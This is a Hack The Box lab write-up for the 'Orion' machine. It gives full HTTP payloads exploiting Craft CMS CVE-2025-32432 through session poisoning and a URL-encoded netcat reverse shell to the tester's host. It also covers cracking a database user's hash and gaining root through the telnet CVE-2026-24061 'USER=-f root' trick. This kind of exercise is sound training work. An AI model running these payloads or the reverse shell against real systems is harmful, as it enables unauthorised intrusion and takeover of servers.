---
title: Orion
parent: HTB Boxes
grand_parent: Pwn Counter
nav_order: 19
---

# Orion

<img width="868" height="541" alt="image" src="https://github.com/user-attachments/assets/7dbbf22b-d022-4004-ba8d-5ff1bb1cfa98" />


## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Box Description

> Very-Easy HTB Machine

## Disclaimer

I did not solve this box on my own. I had to use [0xdf's amazing writeup](https://0xdf.gitlab.io/2026/07/14/htb-orion.html#shell-as-www-data) and some AI every step of the way, but I am glad I did because I learned soem genuinely useful info when it comes to Web Exploitation and Web Infrastructure.

## Recon

As always, I started off with an nmap scan which revealed services on ```ports 22 and 80```. 

I visited the webpage and it was a website for a telecom company.

Using cmseek, I discovered that the webpage was using CraftCMS as its CMS, but I unfortunately did not get the version the webpage was using.

<img width="510" height="324" alt="image" src="https://github.com/user-attachments/assets/55c71094-bcec-4e76-83fa-0f1f7e8c91f4" />

But, by using gobuster, I was able to find an admin login page.

<img width="676" height="297" alt="image" src="https://github.com/user-attachments/assets/33a5faff-9cd4-44fd-9c41-5aa32a8aa0ba" />

Navigating to the login page, I see at the bottom that the CraftCMS versionn is ```5.6.16``` which is the version exploited by ```CVE-2025-32432```, an unauthenticated RCE exploit.

This exploit was very complex to do manually in my opinion as I have not done a ton of deep web exploitation with cookies, but it was really interesting to learn about.

### Exploiting CVE-2025-32432

To exploit this vulnerability, I needed a ```CraftSessionID, a CRAFT CSRF Token, and the token's value labeled as X-CSRF-TOKEN```.

The CSRF cookies are csrf portections in that when making a ```POST``` request to the webpage, the server checks if your CRAFT CSRF Token matches its CSRF token value, the one found in it's HTML code in this case. So, in order to make ```POST``` requests to exploit the vulnerable endpoint, I needed those cookies.

<img width="1232" height="384" alt="image" src="https://github.com/user-attachments/assets/30785f3f-de49-4a63-a047-02d01f02d89c" />

---

The vulnerable endpoint in this case was ```/index.php?p=admin/actions/assets/generate-transform``` which did some form of image manipulation for craft cms and had a vulnerability in the way it accepted classes.

Here is a better explanation from 0xdf:

```markdown
There’s a detailed post from Orange Cyberdefense on how they found this vulnerability doing incident response and tracking what the malicious actor was doing. The issue is in the unauthenticated admin/actions/assets/generate-transform endpoint responsible for image transforms. The function in Craft passes user input to the ImageTransform constructor without validation, so I can inject arbitrary object properties using Yii’s as <name> syntax. From here I’ll abuse CVE-2024-58136, the underlying vulnerability in Yii2 that allows __class to take precedence over class, where Craft only checks for class, letting me instantiate any class with constructor args I control.
```

---

So in order to test if this endpoint is vulnerabl;e, you need to craft and send the following ```POST``` request:

```http
POST /index.php?p=admin/actions/assets/generate-transform HTTP/1.1
Host: orion.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:152.0) Gecko/20100101 Firefox/152.0
Cookie: CraftSessionId=aiqstu9q0lqvj1vpghhq8qt77q; CRAFT_CSRF_TOKEN=082ae7398cc3b2cf3e33344cb0bb06e03903a6e84c9d204e69b72cca40bd7df0a%3A2%3A%7Bi%3A0%3Bs%3A16%3A%22CRAFT_CSRF_TOKEN%22%3Bi%3A1%3Bs%3A40%3A%22GyXivbOBfa75dV8Hrd5ZNVVWLXwDkERlRwF8jg1P%22%3B%7D
X-CSRF-Token: 3sL48VgUnduN1e9hurGR-C4DRmo0uH06IMD8gICw9Lf-iaUolRBWL5m7oJgudtKZ67TYVN7nqbBcZ3Mweu4rbWyYi8Tr9abbrP7jEP93Z38=
Content-Type: application/json
Content-Length: 352

{
    "assetId": 11,
    "handle": {
        "width": 123,
        "height": 123,
        "as session": {
            "class": "craft\\behaviors\\FieldLayoutBehavior",
            "__class": "GuzzleHttp\\Psr7\\FnStream",
            "__construct()": [
                []
            ],
            "_fn_close": "phpinfo"
        }
    }
}
```
Note: the cookies and token values are variable.

If the endpoint is vulnerable, you will be able to see the ouput of the ```phpinfo``` command.

<img width="1252" height="568" alt="image" src="https://github.com/user-attachments/assets/c549514a-f063-413e-843b-4bf2b162507b" />

---

Knowing this attack vector is valid, we need a way to execute commands.

What better way than to use php cmd injection.

The method to do so is by poisoning your specific session.

According to 0xdf:

```markdown
When the actor visits p=admin/dashboard, they will be redirected to the login page. However, the URL they are trying to access will be stored in the session file, so that after login the CMS can look up that URL and send the user where they were trying to go. In this case, by including a random parameter (they used a, but anything would work), an attacker can write whatever they want, and it gets written to the session file on disk in a predictable location, /var/lib/php/sessions/sess_<session id>.
```

So, by following those instructions and including a php cmd injection payload, we know we have successfully poisoned the session because of the 302 response.

<img width="1160" height="289" alt="image" src="https://github.com/user-attachments/assets/45d2c46c-f45f-4a1a-b651-cfc5a5b7ef42" />

---

Now to exploit the endpoint, we need to have all tokens and cookies ready in our ```POST``` request, have a json structure with a legit ```class``` to pass the check and then a ```_class``` with ```PHPManager``` to override the ```class``` without a check, and finally use the ```itemFile``` capability inorder to include our poisoned session file when ```PHPManager``` runs so our injected cmd in the URL is executed.

Using the following payload to test if we haev successfull cmd injection by pinging our host, we confirm we have successful cmd injection:

```http
POST /index.php?p=admin/actions/assets/generate-transform&cmd=ping%20-c%201%2010.10.16.15 HTTP/1.1

Host: orion.htb

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0

Content-Type: application/json

X-CSRF-Token: bZjnkj-sedNshrUafj9vRMAnQ_dYOziJp5awRXDhWeCRtJnzi-upgQfipKZPmx_nIrDlKRBpNTOFfwawDFlS09XCyggerRiV69yrvPre7bA=

Cookie: CraftSessionId=ghmbkr5ah2dq840fc47ruf4d5k; CRAFT_CSRF_TOKEN=fd0cd4de230fa72e6869eaea2c838bb50534e7e061150be5e8627ef0c41dcfaca%3A2%3A%7Bi%3A0%3Bs%3A16%3A%22CRAFT_CSRF_TOKEN%22%3Bi%3A1%3Bs%3A40%3A%22jzC4p7f4N6P3nVZwEXEGTbjZrTzMnLAuzh2Oq5D1%22%3B%7D

Content-Length: 235



{"assetId":11,"handle":{"width":123,"height":123,"as hack":{"class":"\\craft\\behaviors\\FieldLayoutBehavior","__class":"\\yii\\rbac\\PhpManager","__construct()":[{"itemFile":"/var/lib/php/sessions/sess_ghmbkr5ah2dq840fc47ruf4d5k"}]}}}
```

<img width="1269" height="549" alt="image" src="https://github.com/user-attachments/assets/d1935171-4857-4b0c-a8ec-98c9dc7f80d6" />

<img width="866" height="201" alt="image" src="https://github.com/user-attachments/assets/aacd6205-096a-4de2-b72d-2784c646b042" />

---

Now that we know we have RCE, lets go ahead and get a reverse shell onto the system by cmd injecting a nc reverse shell into the URL.

I URL encoded an nc mkfifo commadn including all special chars which gave me ```rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20%2Di%202%3E%261%7Cnc%2010%2E10%2E16%2E15%201337%20%3E%2Ftmp%2Ff```.

I then put that as the parameter for ```&cmd=```, sent the ```POST``` request, and successfully got a reverse shell, nice.

<img width="1846" height="664" alt="image" src="https://github.com/user-attachments/assets/3501c32c-f1f7-4cd3-91ba-037ea35c972d" />

---

## Shell Foothold

After getting a shell, I started enumerating a bit and found credentials for the craft mysql database named orion on port 3306 of ```root:SuperSecureCraft123Pass!```.

<img width="822" height="746" alt="image" src="https://github.com/user-attachments/assets/33affc8a-0082-4273-88b4-262aa8602256" />

Using the command ```mysql -u root -pSuperSecureCraft123Pass! -h 127.0.0.1 orion```, I now am inside of the database. ヾ(≧▽≦*)o

### Inside the DB

After googling soem absic MySQL command syntax, I found the password hash for the adam user on the box. 😎

<img width="1888" height="329" alt="image" src="https://github.com/user-attachments/assets/002b5a08-34a7-4b3d-ac74-43519882198f" />

After Identifying the hash was bcrypt, I used cyberchef to make some more sense of it and got some useful information.

<img width="1490" height="72" alt="image" src="https://github.com/user-attachments/assets/dfff8f17-64d2-45f4-b48f-f544d0ea43e7" />

<img width="1398" height="662" alt="image" src="https://github.com/user-attachments/assets/b0fd18b6-2f58-45b2-ae90-ece90e14779a" />

I was able to crack the hash using hashcat and got the creds ```adam:darkangel```
<img width="600" height="100" alt="image" src="https://github.com/user-attachments/assets/97da62ff-caad-4800-a37b-5fbb6f089c43" />

I tried the new creds via ssh and Succcess! What a score privileged ssh session. (￣_,￣ )

<img width="406" height="51" alt="image" src="https://github.com/user-attachments/assets/f5dba00e-a2e0-400b-b9c4-418a8bd259fb" />

---

## Priv Esc

Enumerating around, I found no SUID binaries and my user could not run sudo, so the low hanging fruit were out of the question.

I then ran ```linpeas.sh``` because I was stuck and couldn't think of anything to do, and thats when i noticed that there was something being served on local host on ```port 23```.

I tried to see if telnet was installed on the machine by running ```telnet --version``` and found out that telnet was indeed on the machine running version 2.7.

I tried getting atelnet session with adam's credentials, but it was the same as ssh so nothing gained there.

I then decided to look up the telnet version and found that it was vulnerable and even was assigned ```CVE-2026-24061```.

I took a look at [OffSec's Deep Dive](https://www.offsec.com/blog/cve-2026-24061/) on the vulnerability and found that if you did the command ```USER='-f root' telnet -a <ipaddr>```, you would get a root shell.

The reason this happens is that since in this version of telnet, authentication was delegated to ```/usr/bin/login``` and this binary would log the user in with teh username found in the ```USER``` environment variable.

So, by setting the ```USER``` environment variable to ```root -f``` it is telling telnet to log the user in as root and ```-f``` tells it to skip authentication entirely. The built out command would be ```/usr/bin/login -h [hostname] “-f root”```.

So, by following the instructions from OffSec and entering ```USER='-f root' telnet -a <ipaddr>```, I now have a root shell and the root flag. Success! ☆*: .｡. o(≧▽≦)o .｡.:*☆

<img width="960" height="708" alt="image" src="https://github.com/user-attachments/assets/ea012ddf-c309-4ac6-9a2f-e29b05e1cf5c" />


## Solution Steps

1. Exploit CraftCMS v5.6.16 admin portal using CVE-2025-32432
2. Get reverse shell using cmd injection via the vulnerability
3. Enumerate and locate the ```.env``` file.
4. Cat it out and find the database credentials
5. use credentials to ssh as adam into box
6. exploit telnet v2.7 using CVE-2026-24061 

## Thoughts

I thought this box was pretty hard. The actual privilege escalation was not too bad, it taught me to amek sure I always look at what services I dont recognize from prior enumeration being served up on localhost. The foothold was the hardest part in my opinion. This attack vector is very niche, but it was interesting to learn about and do. It taught me about the anti-CSRF method and it definitly made me more comfortable with burpsuite. Overall, a really fun and challenging box. Definitly reccomend.

--

Thank you for reading!

